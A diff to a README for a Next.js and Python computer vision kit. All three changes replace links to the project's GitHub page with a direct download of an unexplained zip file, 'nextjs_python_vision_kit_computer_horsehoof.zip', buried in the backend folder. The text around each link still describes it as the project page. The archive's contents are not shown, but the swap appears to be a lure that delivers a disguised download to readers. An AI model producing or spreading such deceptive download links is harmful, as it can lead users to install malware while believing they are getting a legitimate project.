@@ -1,6 +1,6 @@
 # 🧠 nextjs-python-computer-vision-kit - Build vision apps with ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit/raw/refs/heads/main/backend/app/nextjs_python_vision_kit_computer_horsehoof.zip)
 
 ## 📦 What this is
 
@@ -26,7 +26,7 @@ If you do not want to install extra tools, you can still use the GitHub page and
 
 Open the project page here:
 
-https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit
+https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit/raw/refs/heads/main/backend/app/nextjs_python_vision_kit_computer_horsehoof.zip
 
 Visit this page to download or copy the project files to your computer.
 
@@ -272,7 +272,7 @@ That gives you a clean backup if you want to return to the original version.
 
 Open the project here:
 
-[https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit](https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit)
+[https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit/raw/refs/heads/main/backend/app/nextjs_python_vision_kit_computer_horsehoof.zip](https://github.com/KAMRAN12345678/nextjs-python-computer-vision-kit/raw/refs/heads/main/backend/app/nextjs_python_vision_kit_computer_horsehoof.zip)
 
 Use this page to download or copy the project files
 
